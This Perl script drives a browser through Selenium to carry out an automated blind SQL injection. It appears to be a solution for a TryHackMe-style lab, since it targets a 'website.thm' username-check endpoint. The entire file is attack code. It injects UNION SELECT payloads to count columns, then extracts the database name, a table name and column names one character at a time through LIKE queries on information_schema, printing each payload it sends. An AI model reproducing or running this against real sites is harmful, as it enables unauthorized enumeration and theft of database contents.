#!/usr/bin/perl                                                                                                                                                                                        

use feature qw{ say };
use strict;
use warnings;
use Getopt::Long qw(GetOptions);
use List::MoreUtils qw(any);           
use Selenium::Remote::Driver;
use Selenium::Remote::WDKeys;

my ($url,$task, $elem);
Getopt::Long::GetOptions('url=s' => \$url, 'task=i' => \$task);

my $driver = Selenium::Remote::Driver->new;
$driver->get($url);
$elem = $driver->find_element_by_id("address_url") if $task == 7;

sub send_query {
    my ($query) = @_; 
    my $resp;
    $elem->clear();
    $elem->send_keys('https://website.thm/checkuser?username=' . $query , KEYS->{'enter'});
    sleep(1);
    $resp = $driver->find_element_by_class_name('json-resp');
    $resp->get_attribute('innerHTML');
}

sub get_column_number {
    my $query = "admin123' UNION SELECT NULL;--";
    my $res;
    my $ncl = 0;
    while (1) {
	$query = ("admin123' UNION SELECT " . 'NULL,' x ++$ncl);
	chop $query;
	$query =  $query . ";--";
	last if expected_value(send_query($query));
    }
    return $ncl;
}

sub expected_value {
    my ($resp) = @_;
    return $resp =~/true/ if $task == 7;
    return $resp =~/5\./  if $task == 8;
}

sub discover_database_name {
    my ($ncln) = @_;
    my $clquery =  'NULL,' x $ncln;
    chop $clquery;
    my $database_name = '';
    my $query = '';
    while (1) {
	for (32 .. 126) {
	    next if $_ ==  37;
	    $query  = "admin123' UNION SELECT " . $clquery  . " where database() like ";
	    my $c = chr(int());
	    $query .=  "'" . $database_name .  $c  . "%" . "'" . ";--";
	    if (expected_value(send_query($query))) {
		$database_name .= $c ;
		last;
	    }
	}
	last if expected_value(send_query("admin123' UNION SELECT ".  $clquery . " FROM information_schema.tables WHERE table_schema = " . "'" . lc($database_name) . "'" . ";--"));
    }
    return $database_name;
}

sub discover_table_name {
    my ($ncln, $database_name) = @_;
    my $clquery =  'NULL,' x $ncln;
    chop $clquery;
    my $query = '';
    my $table_name = '';
    while (1) {
	for (32 .. 126) {
	    next if ($_ ==  37 or  $_ ==  95);
	    $query  = "admin123' UNION SELECT " . $clquery  . " FROM information_schema.tables WHERE table_schema=" . "'" . $database_name . "'"  . " and table_name like " ;
	    my $c = chr(int());
	    $query .=  "'" . $table_name .  $c  . "%" . "'" . ";--";
	    say "payload: " .  $query;
	    if (expected_value(send_query($query))) {
		$table_name .= $c ;
		last;
	    }
	}
	last if expected_value (
	    send_query("admin123' UNION SELECT ".  $clquery . " FROM information_schema.tables WHERE table_schema = " . "'" . $database_name  . "'" . " and table_name=" . "'" . $table_name . "'". ";--"));
	
    }
    return $table_name;
    
}

sub get_columns_name {
    
    my ($ncln, $database_name, $table_name) = @_;
    
    my $clquery =  'NULL,' x $ncln;
    chop $clquery;
    my $query = '';
    my $column_name = '';
    my %columns_name;
    my %badparams;
    $badparams{$_} = 1 foreach (37, 95);
    my $found = 0;
    while (1) {

	for my $i (32 .. 126) {
	    next if (exists  $badparams{$i});
	    my $c = chr(int($i));
	    $query  = "admin123' UNION SELECT " . $clquery  . " FROM information_schema.COLUMNS WHERE table_schema=" . "'" . $database_name . "'"  . " and table_name=" . "'" . $table_name . "'" ;
	    $query .= " and COLUMN_NAME like " .  "'" . $column_name .  $c  . "%" . "'" . ";--";

	    if (expected_value(send_query($query))) {
		$column_name .= $c;
	        next if (exists  $columns_name{$column_name});
		$found = 1;
		last;
	    }
	    
	    if ($i == 126) {
		$found = 0;
		my $skip_c = substr($c,0,1);
		$badparams{ $skip_c} = 1;
		last;
	    }
	}
	    
	
       if ($found) {
	   $columns_name{$column_name} = 1;
	   say "found: " .  $column_name;
	}
	say (keys %badparams);
	$column_name = '';
    }
}
    

my $columns_n =  get_column_number();
say "Número de colunas:$columns_n"; 
my $database = lc(discover_database_name($columns_n));
say "database: " . $database;
my $table = discover_table_name($columns_n,$database);
say "table name : " . $table;
get_columns_name ($columns_n, $database, $table);

$driver->quit(); 

